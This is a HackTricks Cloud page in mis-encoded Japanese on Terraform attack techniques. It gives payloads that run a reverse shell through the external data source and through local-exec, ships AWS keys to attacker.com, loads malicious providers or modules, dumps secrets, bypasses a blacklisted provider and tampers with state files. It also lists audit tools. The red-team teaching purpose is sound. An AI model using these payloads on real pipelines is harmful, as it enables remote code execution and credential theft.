# Terraform Security

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../.gitbook/assets/image (1) (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../.gitbook/assets/image (1) (1) (1) (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../.gitbook/assets/image (2) (1).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../.gitbook/assets/image (2) (1).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## åŸºæœ¬æƒ…å ±

[ãƒ‰ã‚­ãƒ¥ãƒ¡ãƒ³ãƒˆã‹ã‚‰:](https://developer.hashicorp.com/terraform/intro)

HashiCorp Terraformã¯ã€**ã‚¤ãƒ³ãƒ•ãƒ©ã‚¹ãƒˆãƒ©ã‚¯ãƒãƒ£ã‚’ã‚³ãƒ¼ãƒ‰ã¨ã—ã¦ç®¡ç†ã™ã‚‹ãƒ„ãƒ¼ãƒ«**ã§ã‚ã‚Šã€**ã‚¯ãƒ©ã‚¦ãƒ‰ãŠã‚ˆã³ã‚ªãƒ³ãƒ—ãƒ¬ãƒŸã‚¹ã®ãƒªã‚½ãƒ¼ã‚¹**ã‚’äººé–“ãŒèª­ã¿ã‚„ã™ã„è¨­å®šãƒ•ã‚¡ã‚¤ãƒ«ã§å®šç¾©ã§ãã€ã“ã‚Œã‚’ãƒãƒ¼ã‚¸ãƒ§ãƒ³ç®¡ç†ã€å†åˆ©ç”¨ã€å…±æœ‰ã§ãã¾ã™ã€‚ãã®å¾Œã€ä¸€è²«ã—ãŸãƒ¯ãƒ¼ã‚¯ãƒ•ãƒ­ãƒ¼ã‚’ä½¿ç”¨ã—ã¦ã€ã‚¤ãƒ³ãƒ•ãƒ©ã‚¹ãƒˆãƒ©ã‚¯ãƒãƒ£ã®ãƒ©ã‚¤ãƒ•ã‚µã‚¤ã‚¯ãƒ«å…¨ä½“ã‚’é€šã˜ã¦ãƒ—ãƒ­ãƒ“ã‚¸ãƒ§ãƒ‹ãƒ³ã‚°ãŠã‚ˆã³ç®¡ç†ã§ãã¾ã™ã€‚Terraformã¯ã€ã‚³ãƒ³ãƒ”ãƒ¥ãƒ¼ãƒˆã€ã‚¹ãƒˆãƒ¬ãƒ¼ã‚¸ã€ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ãƒªã‚½ãƒ¼ã‚¹ãªã©ã®ä½ãƒ¬ãƒ™ãƒ«ã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆã ã‘ã§ãªãã€DNSã‚¨ãƒ³ãƒˆãƒªã‚„SaaSæ©Ÿèƒ½ãªã©ã®é«˜ãƒ¬ãƒ™ãƒ«ã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆã‚‚ç®¡ç†ã§ãã¾ã™ã€‚

#### Terraformã¯ã©ã®ã‚ˆã†ã«æ©Ÿèƒ½ã—ã¾ã™ã‹ï¼Ÿ

Terraformã¯ã€ã‚¯ãƒ©ã‚¦ãƒ‰ãƒ—ãƒ©ãƒƒãƒˆãƒ•ã‚©ãƒ¼ãƒ ã‚„ä»–ã®ã‚µãƒ¼ãƒ“ã‚¹ä¸Šã§ãƒªã‚½ãƒ¼ã‚¹ã‚’ä½œæˆãŠã‚ˆã³ç®¡ç†ã—ã¾ã™ã€‚ãƒ—ãƒ­ãƒã‚¤ãƒ€ãƒ¼ã¯ã€TerraformãŒã‚¢ã‚¯ã‚»ã‚¹å¯èƒ½ãªAPIã‚’æŒã¤ã»ã¼ã™ã¹ã¦ã®ãƒ—ãƒ©ãƒƒãƒˆãƒ•ã‚©ãƒ¼ãƒ ã‚„ã‚µãƒ¼ãƒ“ã‚¹ã§æ©Ÿèƒ½ã™ã‚‹ã“ã¨ã‚’å¯èƒ½ã«ã—ã¾ã™ã€‚

![](<../.gitbook/assets/image (177).png>)

HashiCorpã¨Terraformã‚³ãƒŸãƒ¥ãƒ‹ãƒ†ã‚£ã¯ã€ã™ã§ã«**1700ä»¥ä¸Šã®ãƒ—ãƒ­ãƒã‚¤ãƒ€ãƒ¼**ã‚’ä½œæˆã—ã¦ãŠã‚Šã€æ•°åƒã®ç•°ãªã‚‹ã‚¿ã‚¤ãƒ—ã®ãƒªã‚½ãƒ¼ã‚¹ã‚„ã‚µãƒ¼ãƒ“ã‚¹ã‚’ç®¡ç†ã§ãã€ã“ã®æ•°ã¯å¢—ãˆç¶šã‘ã¦ã„ã¾ã™ã€‚ã™ã¹ã¦ã®å…¬é–‹ã•ã‚Œã¦ã„ã‚‹ãƒ—ãƒ­ãƒã‚¤ãƒ€ãƒ¼ã¯ã€[Terraform Registry](https://registry.terraform.io/)ã§è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã€Amazon Web Services (AWS)ã€Azureã€Google Cloud Platform (GCP)ã€Kubernetesã€Helmã€GitHubã€Splunkã€DataDogãªã©ãŒå«ã¾ã‚Œã¾ã™ã€‚

Terraformã®ã‚³ã‚¢ãƒ¯ãƒ¼ã‚¯ãƒ•ãƒ­ãƒ¼ã¯ã€3ã¤ã®ã‚¹ãƒ†ãƒ¼ã‚¸ã§æ§‹æˆã•ã‚Œã¦ã„ã¾ã™ã€‚

* **æ›¸ãè¾¼ã¿:** è¤‡æ•°ã®ã‚¯ãƒ©ã‚¦ãƒ‰ãƒ—ãƒ­ãƒã‚¤ãƒ€ãƒ¼ã‚„ã‚µãƒ¼ãƒ“ã‚¹ã«ã¾ãŸãŒã‚‹ãƒªã‚½ãƒ¼ã‚¹ã‚’å®šç¾©ã—ã¾ã™ã€‚ãŸã¨ãˆã°ã€ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ã‚°ãƒ«ãƒ¼ãƒ—ã¨ãƒ­ãƒ¼ãƒ‰ãƒãƒ©ãƒ³ã‚µãƒ¼ã‚’æŒã¤ä»®æƒ³ãƒ—ãƒ©ã‚¤ãƒ™ãƒ¼ãƒˆã‚¯ãƒ©ã‚¦ãƒ‰ (VPC) ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ä¸Šã®ä»®æƒ³ãƒã‚·ãƒ³ã«ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã‚’ãƒ‡ãƒ—ãƒ­ã‚¤ã™ã‚‹ãŸã‚ã®æ§‹æˆã‚’ä½œæˆã™ã‚‹ã“ã¨ãŒã‚ã‚Šã¾ã™ã€‚
* **è¨ˆç”»:** Terraformã¯ã€æ—¢å­˜ã®ã‚¤ãƒ³ãƒ•ãƒ©ã‚¹ãƒˆãƒ©ã‚¯ãƒãƒ£ã¨è¨­å®šã«åŸºã¥ã„ã¦ã€ä½œæˆã€æ›´æ–°ã€ã¾ãŸã¯ç ´æ£„ã™ã‚‹ã‚¤ãƒ³ãƒ•ãƒ©ã‚¹ãƒˆãƒ©ã‚¯ãƒãƒ£ã‚’èª¬æ˜ã™ã‚‹å®Ÿè¡Œè¨ˆç”»ã‚’ä½œæˆã—ã¾ã™ã€‚
* **é©ç”¨:** æ‰¿èªå¾Œã€Terraformã¯ææ¡ˆã•ã‚ŒãŸæ“ä½œã‚’æ­£ã—ã„é †åºã§å®Ÿè¡Œã—ã€ãƒªã‚½ãƒ¼ã‚¹ã®ä¾å­˜é–¢ä¿‚ã‚’å°Šé‡ã—ã¾ã™ã€‚ãŸã¨ãˆã°ã€VPCã®ãƒ—ãƒ­ãƒ‘ãƒ†ã‚£ã‚’æ›´æ–°ã—ã€ãã®VPCå†…ã®ä»®æƒ³ãƒã‚·ãƒ³ã®æ•°ã‚’å¤‰æ›´ã—ãŸå ´åˆã€Terraformã¯ä»®æƒ³ãƒã‚·ãƒ³ã‚’ã‚¹ã‚±ãƒ¼ãƒªãƒ³ã‚°ã™ã‚‹å‰ã«VPCã‚’å†ä½œæˆã—ã¾ã™ã€‚

![](<../.gitbook/assets/image (215).png>)

### Terraformãƒ©ãƒœ

ã‚³ãƒ³ãƒ”ãƒ¥ãƒ¼ã‚¿ã«terraformã‚’ã‚¤ãƒ³ã‚¹ãƒˆãƒ¼ãƒ«ã™ã‚‹ã ã‘ã§ã™ã€‚

ã“ã“ã«[ã‚¬ã‚¤ãƒ‰](https://learn.hashicorp.com/tutorials/terraform/install-cli)ãŒã‚ã‚Šã€ã“ã“ã«terraformã‚’ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã™ã‚‹[æœ€è‰¯ã®æ–¹æ³•](https://www.terraform.io/downloads)ãŒã‚ã‚Šã¾ã™ã€‚

## Terraformã«ãŠã‘ã‚‹RCE

Terraformã¯ã€**ã‚¦ã‚§ãƒ–ãƒšãƒ¼ã‚¸ã‚„ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ã‚µãƒ¼ãƒ“ã‚¹ã‚’å…¬é–‹ã™ã‚‹ãƒ—ãƒ©ãƒƒãƒˆãƒ•ã‚©ãƒ¼ãƒ ã‚’æŒã£ã¦ã„ãªã„ãŸã‚**ã€terraformã‚’å¦¥å”ã™ã‚‹å”¯ä¸€ã®æ–¹æ³•ã¯ã€**terraformè¨­å®šãƒ•ã‚¡ã‚¤ãƒ«ã‚’è¿½åŠ /å¤‰æ›´ã§ãã‚‹ã“ã¨**ã§ã™ã€‚

ãŸã ã—ã€terraformã¯**éå¸¸ã«æ•æ„Ÿãªã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆ**ã§ã‚ã‚Šã€é©åˆ‡ã«æ©Ÿèƒ½ã™ã‚‹ãŸã‚ã«**ç‰¹æ¨©ã‚¢ã‚¯ã‚»ã‚¹**ã‚’æŒã¤ã•ã¾ã–ã¾ãªå ´æ‰€ã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚

æ”»æ’ƒè€…ãŒterraformãŒå®Ÿè¡Œã•ã‚Œã¦ã„ã‚‹ã‚·ã‚¹ãƒ†ãƒ ã‚’å¦¥å”ã™ã‚‹ä¸»ãªæ–¹æ³•ã¯ã€**terraformè¨­å®šã‚’ä¿å­˜ã™ã‚‹ãƒªãƒã‚¸ãƒˆãƒªã‚’å¦¥å”ã™ã‚‹ã“ã¨**ã§ã™ã€‚ãªãœãªã‚‰ã€ã‚ã‚‹æ™‚ç‚¹ã§ãã‚Œã‚‰ã¯**è§£é‡ˆã•ã‚Œã‚‹**ã‹ã‚‰ã§ã™ã€‚

å®Ÿéš›ã€**PR**ãŒä½œæˆã•ã‚ŒãŸå¾Œã«**terraform plan/applyã‚’è‡ªå‹•çš„ã«å®Ÿè¡Œã™ã‚‹**ã‚½ãƒªãƒ¥ãƒ¼ã‚·ãƒ§ãƒ³ãŒå­˜åœ¨ã—ã¾ã™ã€‚ãŸã¨ãˆã°ã€**Atlantis**ãŒã‚ã‚Šã¾ã™ï¼š

{% content-ref url="atlantis-security.md" %}
[atlantis-security.md](atlantis-security.md)
{% endcontent-ref %}

terraformãƒ•ã‚¡ã‚¤ãƒ«ã‚’å¦¥å”ã§ãã‚‹å ´åˆã€èª°ã‹ãŒ`terraform plan`ã¾ãŸã¯`terraform apply`ã‚’å®Ÿè¡Œã—ãŸã¨ãã«RCEã‚’å®Ÿè¡Œã™ã‚‹ã•ã¾ã–ã¾ãªæ–¹æ³•ãŒã‚ã‚Šã¾ã™ã€‚

### Terraform plan

Terraform planã¯ã€terraformã§**æœ€ã‚‚ä½¿ç”¨ã•ã‚Œã‚‹ã‚³ãƒãƒ³ãƒ‰**ã§ã‚ã‚Šã€terraformã‚’ä½¿ç”¨ã™ã‚‹é–‹ç™ºè€…ã‚„ã‚½ãƒªãƒ¥ãƒ¼ã‚·ãƒ§ãƒ³ã¯å¸¸ã«å‘¼ã³å‡ºã—ã¦ã„ã¾ã™ã€‚ãã®ãŸã‚ã€**RCEã‚’å–å¾—ã™ã‚‹æœ€ã‚‚ç°¡å˜ãªæ–¹æ³•**ã¯ã€ä»»æ„ã®ã‚³ãƒãƒ³ãƒ‰ã‚’å®Ÿè¡Œã™ã‚‹terraformè¨­å®šãƒ•ã‚¡ã‚¤ãƒ«ã‚’æ¯’ã™ã‚‹ã“ã¨ã§ã™ã€‚

**å¤–éƒ¨ãƒ—ãƒ­ãƒã‚¤ãƒ€ãƒ¼ã‚’ä½¿ç”¨ã™ã‚‹**

Terraformã¯ã€Terraformã¨å¤–éƒ¨ãƒ—ãƒ­ã‚°ãƒ©ãƒ ã¨ã®ã‚¤ãƒ³ã‚¿ãƒ¼ãƒ•ã‚§ãƒ¼ã‚¹ã‚’æä¾›ã™ã‚‹[`external`ãƒ—ãƒ­ãƒã‚¤ãƒ€ãƒ¼](https://registry.terraform.io/providers/hashicorp/external/latest/docs)ã‚’æä¾›ã—ã¦ã„ã¾ã™ã€‚`external`ãƒ‡ãƒ¼ã‚¿ã‚½ãƒ¼ã‚¹ã‚’ä½¿ç”¨ã—ã¦ã€`plan`ä¸­ã«ä»»æ„ã®ã‚³ãƒ¼ãƒ‰ã‚’å®Ÿè¡Œã§ãã¾ã™ã€‚

terraformè¨­å®šãƒ•ã‚¡ã‚¤ãƒ«ã«æ¬¡ã®ã‚ˆã†ãªã‚‚ã®ã‚’æ³¨å…¥ã™ã‚‹ã¨ã€`terraform plan`ã‚’å®Ÿè¡Œã—ãŸã¨ãã«ãƒªãƒãƒ¼ã‚¹ã‚·ã‚§ãƒ«ãŒå®Ÿè¡Œã•ã‚Œã¾ã™ï¼š
```javascript
data "external" "example" {
program = ["sh", "-c", "curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh"]
}
```
**ã‚«ã‚¹ã‚¿ãƒ ãƒ—ãƒ­ãƒã‚¤ãƒ€ãƒ¼ã®ä½¿ç”¨**

æ”»æ’ƒè€…ã¯ã€[Terraform Registry](https://registry.terraform.io/)ã«[ã‚«ã‚¹ã‚¿ãƒ ãƒ—ãƒ­ãƒã‚¤ãƒ€ãƒ¼](https://learn.hashicorp.com/tutorials/terraform/provider-setup)ã‚’é€ä¿¡ã—ã€ãã®å¾Œã€æ©Ÿèƒ½ãƒ–ãƒ©ãƒ³ãƒã®Terraformã‚³ãƒ¼ãƒ‰ã«è¿½åŠ ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ï¼ˆ[ã“ã¡ã‚‰ã®ä¾‹](https://alex.kaskaso.li/post/terraform-plan-rce)ï¼‰ï¼š
```javascript
terraform {
required_providers {
evil = {
source  = "evil/evil"
version = "1.0"
}
}
}

provider "evil" {}
```
ãƒ—ãƒ­ãƒã‚¤ãƒ€ãƒ¼ã¯ `init` ã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã•ã‚Œã€`plan` ãŒå®Ÿè¡Œã•ã‚Œã‚‹ã¨æ‚ªæ„ã®ã‚ã‚‹ã‚³ãƒ¼ãƒ‰ãŒå®Ÿè¡Œã•ã‚Œã¾ã™ã€‚

ä¾‹ã¯ [https://github.com/rung/terraform-provider-cmdexec](https://github.com/rung/terraform-provider-cmdexec) ã§è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

**å¤–éƒ¨å‚ç…§ã‚’ä½¿ç”¨ã™ã‚‹**

å‰è¿°ã®2ã¤ã®ã‚ªãƒ—ã‚·ãƒ§ãƒ³ã¯ä¾¿åˆ©ã§ã™ãŒã€ã‚ã¾ã‚Šã‚¹ãƒ†ãƒ«ã‚¹æ€§ãŒã‚ã‚Šã¾ã›ã‚“ï¼ˆ2ã¤ç›®ã¯ã‚ˆã‚Šã‚¹ãƒ†ãƒ«ã‚¹æ€§ãŒã‚ã‚Šã¾ã™ãŒã€1ã¤ç›®ã‚ˆã‚Šã‚‚è¤‡é›‘ã§ã™ï¼‰ã€‚ã“ã®æ”»æ’ƒã‚’**ã‚ˆã‚Šã‚¹ãƒ†ãƒ«ã‚¹ãªæ–¹æ³•**ã§å®Ÿè¡Œã™ã‚‹ã“ã¨ã‚‚ã§ãã¾ã™ã€‚ä»¥ä¸‹ã®ææ¡ˆã«å¾“ã£ã¦ãã ã•ã„ï¼š

* terraformãƒ•ã‚¡ã‚¤ãƒ«ã«rev shellã‚’ç›´æ¥è¿½åŠ ã™ã‚‹ä»£ã‚ã‚Šã«ã€rev shellã‚’å«ã‚€**å¤–éƒ¨ãƒªã‚½ãƒ¼ã‚¹ã‚’ãƒ­ãƒ¼ãƒ‰**ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ï¼š
```javascript
module "not_rev_shell" {
source = "git@github.com:carlospolop/terraform_external_module_rev_shell//modules"
}
```
ã‚ãªãŸã¯[https://github.com/carlospolop/terraform\_external\_module\_rev\_shell/tree/main/modules](https://github.com/carlospolop/terraform_external_module_rev_shell/tree/main/modules)ã§rev shellã‚³ãƒ¼ãƒ‰ã‚’è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

* å¤–éƒ¨ãƒªã‚½ãƒ¼ã‚¹ã§ã¯ã€**ref**æ©Ÿèƒ½ã‚’ä½¿ç”¨ã—ã¦ã€ãƒªãƒã‚¸ãƒˆãƒªå†…ã®**ãƒ–ãƒ©ãƒ³ãƒã«ã‚ã‚‹terraform rev shellã‚³ãƒ¼ãƒ‰ã‚’éš ã™**ã“ã¨ãŒã§ãã¾ã™ã€‚ä¾‹ãˆã°ã€æ¬¡ã®ã‚ˆã†ã«ã—ã¾ã™: `git@github.com:carlospolop/terraform_external_module_rev_shell//modules?ref=b401d2b`

### Terraform Apply

Terraform applyã¯ã™ã¹ã¦ã®å¤‰æ›´ã‚’é©ç”¨ã™ã‚‹ãŸã‚ã«å®Ÿè¡Œã•ã‚Œã¾ã™ã€‚ã¾ãŸã€**æ‚ªæ„ã®ã‚ã‚‹Terraformãƒ•ã‚¡ã‚¤ãƒ«ã‚’**[**local-exec**](https://www.terraform.io/docs/provisioners/local-exec.html)**ã‚’ä½¿ã£ã¦RCEã‚’å–å¾—ã™ã‚‹ãŸã‚ã«æ‚ªç”¨ã™ã‚‹ã“ã¨ã‚‚ã§ãã¾ã™ã€‚**\
æ¬¡ã®ã‚ˆã†ãªãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ãŒ`main.tf`ãƒ•ã‚¡ã‚¤ãƒ«ã«å«ã¾ã‚Œã‚‹ã“ã¨ã‚’ç¢ºèªã™ã‚‹ã ã‘ã§ã™:
```json
// Payload 1 to just steal a secret
resource "null_resource" "secret_stealer" {
provisioner "local-exec" {
command = "curl https://attacker.com?access_key=$AWS_ACCESS_KEY&secret=$AWS_SECRET_KEY"
}
}

// Payload 2 to get a rev shell
resource "null_resource" "rev_shell" {
provisioner "local-exec" {
command = "sh -c 'curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh'"
}
}
```
**å‰ã®æŠ€è¡“ã‹ã‚‰ã®ææ¡ˆ**ã«å¾“ã£ã¦ã€ã“ã®æ”»æ’ƒã‚’**å¤–éƒ¨å‚ç…§ã‚’ä½¿ç”¨ã—ã¦ã‚ˆã‚Šã‚¹ãƒ†ãƒ«ã‚¹çš„ã«å®Ÿè¡Œ**ã—ã¾ã™ã€‚

## Secrets Dumps

`terraform apply`ã‚’å®Ÿè¡Œã™ã‚‹ã“ã¨ã§**terraformã«ã‚ˆã£ã¦ä½¿ç”¨ã•ã‚Œã‚‹ç§˜å¯†ã®å€¤ã‚’ãƒ€ãƒ³ãƒ—**ã™ã‚‹ã«ã¯ã€terraformãƒ•ã‚¡ã‚¤ãƒ«ã«æ¬¡ã®ã‚ˆã†ãªã‚‚ã®ã‚’è¿½åŠ ã—ã¾ã™:
```json
output "dotoken" {
value = nonsensitive(var.do_token)
}
```
## Terraformã‚¹ãƒ†ãƒ¼ãƒˆãƒ•ã‚¡ã‚¤ãƒ«ã®æ‚ªç”¨

terraformã‚¹ãƒ†ãƒ¼ãƒˆãƒ•ã‚¡ã‚¤ãƒ«ã«æ›¸ãè¾¼ã¿ã‚¢ã‚¯ã‚»ã‚¹ãŒã‚ã‚‹ãŒã€terraformã‚³ãƒ¼ãƒ‰ã‚’å¤‰æ›´ã§ããªã„å ´åˆã€[**ã“ã®ç ”ç©¶**](https://blog.plerion.com/hacking-terraform-state-privilege-escalation/)ã¯ãƒ•ã‚¡ã‚¤ãƒ«ã‚’åˆ©ç”¨ã™ã‚‹ãŸã‚ã®èˆˆå‘³æ·±ã„ã‚ªãƒ—ã‚·ãƒ§ãƒ³ã‚’æä¾›ã—ã¾ã™ã€‚

### ãƒªã‚½ãƒ¼ã‚¹ã®å‰Šé™¤ <a href="#deleting-resources" id="deleting-resources"></a>

ãƒªã‚½ãƒ¼ã‚¹ã‚’ç ´å£Šã™ã‚‹æ–¹æ³•ã¯2ã¤ã‚ã‚Šã¾ã™ï¼š

1. **å®Ÿéš›ã®ãƒªã‚½ãƒ¼ã‚¹ã‚’å‰Šé™¤ã™ã‚‹ãŸã‚ã«ã€ãƒ©ãƒ³ãƒ€ãƒ ãªåå‰ã®ãƒªã‚½ãƒ¼ã‚¹ã‚’ã‚¹ãƒ†ãƒ¼ãƒˆãƒ•ã‚¡ã‚¤ãƒ«ã«æŒ¿å…¥ã™ã‚‹**

terraformã¯ãã®ãƒªã‚½ãƒ¼ã‚¹ãŒå­˜åœ¨ã™ã¹ãã§ã¯ãªã„ã¨åˆ¤æ–­ã—ã€ãã‚Œã‚’å‰Šé™¤ã—ã¾ã™ï¼ˆæŒ‡å®šã•ã‚ŒãŸå®Ÿéš›ã®ãƒªã‚½ãƒ¼ã‚¹IDã«å¾“ã£ã¦ï¼‰ã€‚å‰ã®ãƒšãƒ¼ã‚¸ã®ä¾‹ï¼š
```json
{
"mode": "managed",
"type": "aws_instance",
"name": "example",
"provider": "provider[\"registry.terraform.io/hashicorp/aws\"]",
"instances": [
{
"attributes": {
"id": "i-1234567890abcdefg"
}
}
]
},
```
2. **ãƒªã‚½ãƒ¼ã‚¹ã‚’å‰Šé™¤ã™ã‚‹æ–¹æ³•ã‚’å¤‰æ›´ã—ã¦ã€æ›´æ–°ã§ããªã„ã‚ˆã†ã«ã™ã‚‹ï¼ˆãã†ã™ã‚Œã°å‰Šé™¤ã•ã‚Œå†ä½œæˆã•ã‚Œã‚‹ï¼‰**

EC2ã‚¤ãƒ³ã‚¹ã‚¿ãƒ³ã‚¹ã®å ´åˆã€ã‚¤ãƒ³ã‚¹ã‚¿ãƒ³ã‚¹ã®ã‚¿ã‚¤ãƒ—ã‚’å¤‰æ›´ã™ã‚‹ã ã‘ã§ã€terraformãŒå‰Šé™¤ã—ã¦å†ä½œæˆã—ã¾ã™ã€‚

### RCE

[ã‚«ã‚¹ã‚¿ãƒ ãƒ—ãƒ­ãƒã‚¤ãƒ€ãƒ¼ã‚’ä½œæˆã™ã‚‹](https://developer.hashicorp.com/terraform/tutorials/providers-plugin-framework/providers-plugin-framework-provider)ã“ã¨ã‚‚å¯èƒ½ã§ã€terraformã‚¹ãƒ†ãƒ¼ãƒˆãƒ•ã‚¡ã‚¤ãƒ«å†…ã®ãƒ—ãƒ­ãƒã‚¤ãƒ€ãƒ¼ã®1ã¤ã‚’æ‚ªæ„ã®ã‚ã‚‹ã‚‚ã®ã«ç½®ãæ›ãˆã‚‹ã‹ã€æ‚ªæ„ã®ã‚ã‚‹ãƒ—ãƒ­ãƒã‚¤ãƒ€ãƒ¼ã‚’æŒã¤ç©ºã®ãƒªã‚½ãƒ¼ã‚¹ã‚’è¿½åŠ ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚å…ƒã®ç ”ç©¶ã‹ã‚‰ã®ä¾‹:
```json
"resources": [
{
"mode": "managed",
"type": "scaffolding_example",
"name": "example",
"provider": "provider[\"registry.terraform.io/dagrz/terrarizer\"]",
"instances": [

]
},
```
### ãƒ–ãƒ©ãƒƒã‚¯ãƒªã‚¹ãƒˆã«ç™»éŒ²ã•ã‚ŒãŸãƒ—ãƒ­ãƒã‚¤ãƒ€ãƒ¼ã®ç½®ãæ›ãˆ

`hashicorp/external` ãŒãƒ–ãƒ©ãƒƒã‚¯ãƒªã‚¹ãƒˆã«ç™»éŒ²ã•ã‚Œã¦ã„ã‚‹çŠ¶æ³ã«é­é‡ã—ãŸå ´åˆã€æ¬¡ã®æ‰‹é †ã§ `external` ãƒ—ãƒ­ãƒã‚¤ãƒ€ãƒ¼ã‚’å†å®Ÿè£…ã§ãã¾ã™ã€‚æ³¨æ„: https://registry.terraform.io/providers/nazarewk/external/latest ã«å…¬é–‹ã•ã‚ŒãŸ external ãƒ—ãƒ­ãƒã‚¤ãƒ€ãƒ¼ã®ãƒ•ã‚©ãƒ¼ã‚¯ã‚’ä½¿ç”¨ã—ã¦ã„ã¾ã™ã€‚è‡ªåˆ†è‡ªèº«ã®ãƒ•ã‚©ãƒ¼ã‚¯ã‚„å†å®Ÿè£…ã‚’å…¬é–‹ã™ã‚‹ã“ã¨ã‚‚ã§ãã¾ã™ã€‚
```terraform
terraform {
required_providers {
external = {
source  = "nazarewk/external"
version = "3.0.0"
}
}
}
```
ãã®å¾Œã€é€šå¸¸é€šã‚Š `external` ã‚’ä½¿ç”¨ã§ãã¾ã™ã€‚
```terraform
data "external" "example" {
program = ["sh", "-c", "whoami"]
}
```
## è‡ªå‹•ç›£æŸ»ãƒ„ãƒ¼ãƒ«

### [**Snyk Infrastructure as Code (IaC)**](https://snyk.io/product/infrastructure-as-code-security/)

Snykã¯ã€Terraformã€CloudFormationã€Kubernetesã€ãŠã‚ˆã³ãã®ä»–ã®IaCãƒ•ã‚©ãƒ¼ãƒãƒƒãƒˆã«ãŠã‘ã‚‹è„†å¼±æ€§ã¨èª¤è¨­å®šã‚’æ¤œå‡ºã™ã‚‹åŒ…æ‹¬çš„ãªInfrastructure as Code (IaC)ã‚¹ã‚­ãƒ£ãƒ³ã‚½ãƒªãƒ¥ãƒ¼ã‚·ãƒ§ãƒ³ã‚’æä¾›ã—ã¾ã™ã€‚

* **ç‰¹å¾´:**
* ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£è„†å¼±æ€§ã¨ã‚³ãƒ³ãƒ—ãƒ©ã‚¤ã‚¢ãƒ³ã‚¹å•é¡Œã®ãƒªã‚¢ãƒ«ã‚¿ã‚¤ãƒ ã‚¹ã‚­ãƒ£ãƒ³ã€‚
* ãƒãƒ¼ã‚¸ãƒ§ãƒ³ç®¡ç†ã‚·ã‚¹ãƒ†ãƒ ï¼ˆGitHubã€GitLabã€Bitbucketï¼‰ã¨ã®çµ±åˆã€‚
* è‡ªå‹•ä¿®æ­£ãƒ—ãƒ«ãƒªã‚¯ã‚¨ã‚¹ãƒˆã€‚
* è©³ç´°ãªä¿®æ­£ã‚¢ãƒ‰ãƒã‚¤ã‚¹ã€‚
* **ã‚µã‚¤ãƒ³ã‚¢ãƒƒãƒ—:** [Snyk](https://snyk.io/)ã§ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã‚’ä½œæˆã—ã¾ã™ã€‚
```bash
brew tap snyk/tap
brew install snyk
snyk auth
snyk iac test /path/to/terraform/code
```
### [Checkov](https://github.com/bridgecrewio/checkov) <a href="#install-checkov-from-pypi" id="install-checkov-from-pypi"></a>

**Checkov** ã¯ã€ã‚¤ãƒ³ãƒ•ãƒ©ã‚¹ãƒˆãƒ©ã‚¯ãƒãƒ£ã‚’ã‚³ãƒ¼ãƒ‰ã¨ã—ã¦æ‰±ã† (IaC) ãŸã‚ã®é™çš„ã‚³ãƒ¼ãƒ‰åˆ†æãƒ„ãƒ¼ãƒ«ã§ã‚ã‚Šã€ç”»åƒã‚„ã‚ªãƒ¼ãƒ—ãƒ³ã‚½ãƒ¼ã‚¹ãƒ‘ãƒƒã‚±ãƒ¼ã‚¸ã®ãŸã‚ã®ã‚½ãƒ•ãƒˆã‚¦ã‚§ã‚¢æ§‹æˆåˆ†æ (SCA) ãƒ„ãƒ¼ãƒ«ã§ã‚‚ã‚ã‚Šã¾ã™ã€‚

ãã‚Œã¯ã€[Terraform](https://terraform.io/) ã€[Terraform plan](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Terraform%20Plan%20Scanning.md) ã€[Cloudformation](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Cloudformation.md) ã€[AWS SAM](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/AWS%20SAM.md) ã€[Kubernetes](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Kubernetes.md) ã€[Helm charts](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Helm.md) ã€[Kustomize](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Kustomize.md) ã€[Dockerfile](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Dockerfile.md) ã€[Serverless](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Serverless%20Framework.md) ã€[Bicep](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Bicep.md) ã€[OpenAPI](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/OpenAPI.md) 